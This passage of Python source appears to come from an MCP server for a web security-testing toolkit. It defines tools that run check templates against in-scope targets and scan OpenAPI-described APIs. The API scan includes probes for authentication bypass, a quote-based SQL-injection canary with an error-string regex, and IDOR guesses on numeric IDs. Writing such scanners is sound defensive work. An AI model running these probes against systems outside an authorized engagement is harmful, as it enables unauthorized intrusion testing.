        return f"Unknown fact type '{fact_type}'. Valid types: {', '.join(FACT_TYPES)}"

    facts = graph.facts_of(fact_type)
    if not facts:
        return f"No '{fact_type}' facts recorded yet."

    facts.sort(key=lambda f: f.last_seen, reverse=True)
    lines = [f"{len(facts)} '{fact_type}' fact(s) (showing up to {limit}):", ""]
    for fact in facts[:limit]:
        attrs = ", ".join(f"{k}={v}" for k, v in fact.attrs.items() if v not in (None, "", [], {}))
        src = ",".join(fact.sources)
        lines.append(f"  {fact.identity}")
        if attrs:
            lines.append(f"      {attrs}")
        lines.append(f"      seen {fact.times_seen}x via [{src}]")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_run_checks(target: str, templates_dir: str = "", timeout: float = 10.0) -> str:
    """
    Run declarative security-check templates against a target (Phase 6C).

    Executes the built-in template library (plus any *.yaml templates in
    templates_dir) against the target URL. Each template declares HTTP requests
    with matchers (status/word/regex/header); a match emits a finding with the
    raw request/response captured as replayable evidence. Findings flow into the
    normalized asset graph (see ursa_asset_graph) and are saved for export/diff.

    Respects the active engagement scope — refuses out-of-scope targets.

    Args:
        target: Base URL to test, e.g. "https://example.com".
        templates_dir: Optional path to a directory of custom *.yaml templates.
        timeout: Per-request timeout in seconds.
    """
    from ursa_minor.engagement import check as _scope_check
    from ursa_minor.checkengine import builtin_templates, load_templates_from_dir, run_templates

    scope = _scope_check(target)
    if not scope["in_scope"]:
        return f"Refusing to run: target is OUT OF SCOPE — {scope['reason']}"

    templates = builtin_templates()
    if templates_dir:
        templates.extend(load_templates_from_dir(templates_dir))

    findings = run_templates(templates, target, timeout=timeout)

    lines = [
        f"Declarative checks against {target}",
        f"Templates run: {len(templates)} | Findings: {len(findings)}",
        "",
    ]
    if not findings:
        lines.append("No template matched. (Target may be clean, or behind auth/WAF.)")
    else:
        for f in findings:
            lines.append(f"[{f['severity'].upper()}] {f['title']}  ({f['template_id']})")
            lines.append(f"    {f['matched_at']}")
            refs = " ".join(r for r in (f.get("wstg"), f.get("asvs")) if r)
            if refs:
                lines.append(f"    {refs}")

    result = "\n".join(lines)
    return _auto_save("run_checks", result,
                      {"target": target, "templates": len(templates), "findings": len(findings)},
                      structured_data=findings)


# ── API / OpenAPI Schema Scan ──


@mcp_server.tool()
def api_scan(
    url: str,
    spec_path: str | None = None,
    auth_header: str | None = None,
    cookies: str | None = None,
    timeout: float = 10.0,
) -> str:
    """
    Discover and test API endpoints using an OpenAPI / Swagger specification.

    Discovery: if no spec_path is given, probes common spec locations
    (/openapi.json, /swagger.json, /api/docs, /api/openapi.json,
    /v1/openapi.json, /docs/swagger.json) and uses the first one found.

    For each endpoint + parameter combination in the spec, generates targeted
    probes for:
    - Unauthenticated access to authenticated endpoints
    - Missing/malformed required parameters (expect 4xx, flag 200/500)
    - Basic injection canary in string parameters (quote + bracket)
    - Enumerable numeric ID parameters (IDOR canary)

    Supports authenticated scanning via auth_header or cookies.

    Args:
        url: Target base URL (e.g., "http://target.com" or "http://target.com/api")
        spec_path: URL or path suffix to the OpenAPI spec. If omitted, auto-detected.
        auth_header: Authorization header value (e.g., "Bearer eyJ...")
        cookies: Cookie string (e.g., "session=abc123")
        timeout: Request timeout in seconds (default 10.0)
    """
    import json as _json
    import urllib.request
    import urllib.error
    import urllib.parse

    _UA = "ursa-minor/1 api-scan"

    def _get(path: str, extra_headers: dict | None = None) -> tuple[int, dict, str]:
        try:
            full = urllib.parse.urljoin(url.rstrip("/") + "/", path.lstrip("/"))
            req = urllib.request.Request(full, method="GET")
            req.add_header("User-Agent", _UA)
            req.add_header("Accept", "application/json, */*")
            if auth_header:
                req.add_header("Authorization", auth_header)
            if cookies:
                req.add_header("Cookie", cookies)
            if extra_headers:
                for k, v in extra_headers.items():
                    req.add_header(k, v)
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read(65536).decode("utf-8", errors="ignore")
                return r.status, dict(r.headers), body
        except urllib.error.HTTPError as e:
            body = e.read(4096).decode("utf-8", errors="ignore") if e.fp else ""
            return e.code, dict(e.headers) if e.headers else {}, body
        except Exception as exc:
            return 0, {}, str(exc)

    # ── Spec discovery ────────────────────────────────────────────────────────
    spec_candidates = [
        spec_path,
        "/openapi.json", "/openapi.yaml",
        "/swagger.json", "/swagger/v1/swagger.json",
        "/api/openapi.json", "/api/swagger.json",
        "/api/docs", "/api/v1/openapi.json",
        "/v1/openapi.json", "/docs/openapi.json",
        "/api-docs", "/api-docs/swagger.json",
    ]

    spec_data: dict | None = None
    spec_url_used: str = ""

    for candidate in spec_candidates:
        if not candidate:
            continue
        status, headers, body = _get(candidate)
        if status == 200 and body.strip().startswith("{"):
            try:
                spec_data = _json.loads(body)
                # Must have paths key to be a valid OpenAPI spec
                if "paths" in spec_data:
                    spec_url_used = candidate
                    break
                spec_data = None
            except _json.JSONDecodeError:
                pass

    lines = [f"API Scan: {url}", ""]

    if spec_data is None:
        lines.append("No OpenAPI/Swagger spec found. Probed:")
        for c in spec_candidates[1:]:
            lines.append(f"  {c}")
        lines.append("")
        lines.append("To scan without a spec, use vuln_scan or dirbust instead.")
        result = "\n".join(lines)
        return _auto_save("api_scan", result, {"url": url, "spec_found": False})

    lines.append(f"Spec: {spec_url_used}")
    info = spec_data.get("info", {})
    lines.append(f"Title: {info.get('title', '(none)')}  v{info.get('version', '?')}")

    paths_obj = spec_data.get("paths", {})
    lines.append(f"Endpoints in spec: {len(paths_obj)}")
    lines.append("")

    # Build server base path from spec
    servers = spec_data.get("servers", [])
    spec_base = ""
    if servers and isinstance(servers, list):
        spec_base = servers[0].get("url", "")
        if spec_base.startswith("http"):
            # Absolute URL in spec — strip to path only
            spec_base = urllib.parse.urlparse(spec_base).path.rstrip("/")

    findings: list[dict] = []
    endpoints_tested = 0

    for path_tmpl, methods_obj in list(paths_obj.items())[:40]:  # cap at 40 endpoints
        if not isinstance(methods_obj, dict):
            continue

        endpoint_path = (spec_base + path_tmpl).replace("//", "/")

        for method, op in methods_obj.items():
            method = method.upper()
            if method not in ("GET", "POST", "PUT", "PATCH", "DELETE"):
                continue
            if not isinstance(op, dict):
                continue

            endpoints_tested += 1
            security = op.get("security", spec_data.get("security", []))
            requires_auth = bool(security)

            # Collect parameters from spec
            params = op.get("parameters", [])
            # Also include path-level params
            params = list(paths_obj[path_tmpl].get("parameters", [])) + params

            # ── Test 1: unauthenticated access to secured endpoint ────────────
            if requires_auth and not auth_header and not cookies:
                test_path = path_tmpl  # use template, server will reject path params
                status, _, _ = _get(test_path)
                if status == 200:
                    findings.append({
                        "severity": "HIGH",
                        "type": "auth_bypass_candidate",
                        "endpoint": f"{method} {path_tmpl}",
                        "detail": f"Spec marks endpoint as requiring auth but returned {status} without credentials",
                        "wstg": "WSTG-ATHN-01",
                    })
                elif status not in (401, 403):
                    findings.append({
                        "severity": "LOW",
                        "type": "unexpected_status_no_auth",
                        "endpoint": f"{method} {path_tmpl}",
                        "detail": f"Expected 401/403 without auth, got {status}",
                        "wstg": "WSTG-ATHN-01",
                    })

            # ── Resolve concrete path (replace {param} with test values) ─────
            concrete_path = path_tmpl
            for p in params:
                if p.get("in") == "path":
                    pname = p.get("name", "id")
                    ptype = p.get("schema", {}).get("type", "string")
                    concrete_path = concrete_path.replace(
                        f"{{{pname}}}", "1" if ptype in ("integer", "number") else "test"
                    )

            # ── Test 2: missing required params → expect 4xx, flag 200/500 ───
            required_query = [
                p for p in params
                if p.get("in") == "query" and p.get("required", False)
            ]
            if required_query and method == "GET":
                status, _, body = _get(concrete_path)
                if status == 500:
                    findings.append({
                        "severity": "MEDIUM",
                        "type": "missing_param_500",
                        "endpoint": f"GET {path_tmpl}",
                        "detail": "Server returns 500 when required query params are missing — may leak stack trace",
                        "wstg": "WSTG-CONF-11",
                    })
                elif status == 200:
                    findings.append({
                        "severity": "LOW",
                        "type": "missing_required_param_200",
                        "endpoint": f"GET {path_tmpl}",
                        "detail": "Endpoint returns 200 when required params are absent — validation may be missing",
                        "wstg": "WSTG-INPV-13",
                    })

            # ── Test 3: injection canary in string query params ───────────────
            string_params = [
                p for p in params
                if p.get("in") == "query"
                and p.get("schema", {}).get("type", "string") == "string"
            ]
            for p in string_params[:3]:  # cap to 3 per endpoint
                pname = p["name"]
                canary_url = (
                    urllib.parse.urljoin(url.rstrip("/") + "/", concrete_path.lstrip("/"))
                    + f"?{pname}='"
                )
                try:
                    req = urllib.request.Request(canary_url)
                    req.add_header("User-Agent", _UA)
                    if auth_header:
                        req.add_header("Authorization", auth_header)
                    if cookies:
                        req.add_header("Cookie", cookies)
                    with urllib.request.urlopen(req, timeout=timeout) as r:
                        canary_status = r.status
                        canary_body = r.read(4096).decode("utf-8", errors="ignore")
                except urllib.error.HTTPError as e:
                    canary_status = e.code
                    canary_body = ""
                except Exception:
                    canary_status = 0
                    canary_body = ""

                import re as _re
                if canary_status == 500 or _re.search(
                    r"sql syntax|mysql|sqlite|postgresql|ORA-\d+|SQLSTATE",
                    canary_body, _re.IGNORECASE
                ):
                    findings.append({
                        "severity": "CRITICAL",
                        "type": "sqli_canary",
                        "endpoint": f"GET {path_tmpl}",
                        "param": pname,
                        "detail": f"Quote canary caused status {canary_status} — possible SQL injection",
                        "wstg": "WSTG-INPV-05",
                    })

            # ── Test 4: IDOR canary on integer path/query params ─────────────
            int_path_params = [
                p for p in params
                if p.get("schema", {}).get("type") in ("integer", "number")
                and p.get("in") == "path"
            ]
            if int_path_params and method == "GET":
                # Try id=0 and id=99999 — flag if both return 200 with same size
                results_sizes = []
                for test_val in ("0", "99999"):
                    test_path_i = path_tmpl
                    for p in int_path_params:
                        test_path_i = test_path_i.replace(f"{{{p['name']}}}", test_val)
                    s, _, b = _get(test_path_i)
                    results_sizes.append((s, len(b)))
                if (results_sizes[0][0] == 200 and results_sizes[1][0] == 200
                        and abs(results_sizes[0][1] - results_sizes[1][1]) < 50):
                    findings.append({
                        "severity": "MEDIUM",
                        "type": "idor_candidate",
                        "endpoint": f"GET {path_tmpl}",
                        "detail": "Integer ID parameters return 200 for arbitrary values (0, 99999) with similar body sizes — IDOR candidate",
                        "wstg": "WSTG-ATHZ-04",
                    })

    # ── Format output ─────────────────────────────────────────────────────────
    lines.append(f"Endpoints tested: {endpoints_tested}")
    if auth_header or cookies:
        lines.append(f"Auth: {'Authorization header' if auth_header else ''}{'  Cookies' if cookies else ''}".strip())
    lines.append("")

    if findings:
        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        findings.sort(key=lambda x: sev_order.get(x.get("severity", "INFO"), 5))
        lines.append(f"Findings ({len(findings)}):")
        for f in findings:
            ep = f.get("endpoint", "")
            detail = f.get("detail", "")
            wstg = f.get("wstg", "")
            param = f" param={f['param']}" if "param" in f else ""
            lines.append(f"  [{f['severity']}] {ep}{param} — {detail} [{wstg}]")
    else:
        lines.append("No findings detected.")

    # Endpoint inventory
    lines.append("")
    lines.append("Endpoint inventory:")
    for path_tmpl, methods_obj in list(paths_obj.items())[:40]:
        if isinstance(methods_obj, dict):
            meths = [m.upper() for m in methods_obj
                     if m.upper() in ("GET","POST","PUT","PATCH","DELETE","OPTIONS")]
            if meths:
                lines.append(f"  {', '.join(meths):20s} {path_tmpl}")
    if len(paths_obj) > 40:
        lines.append(f"  ... and {len(paths_obj) - 40} more")

    result = "\n".join(lines)
    return _auto_save(
        "api_scan", result,
        {"url": url, "spec": spec_url_used, "endpoints": endpoints_tested,
         "findings": len(findings), "spec_found": True},
        structured_data=findings,
    )


if __name__ == "__main__":
    mcp_server.run()
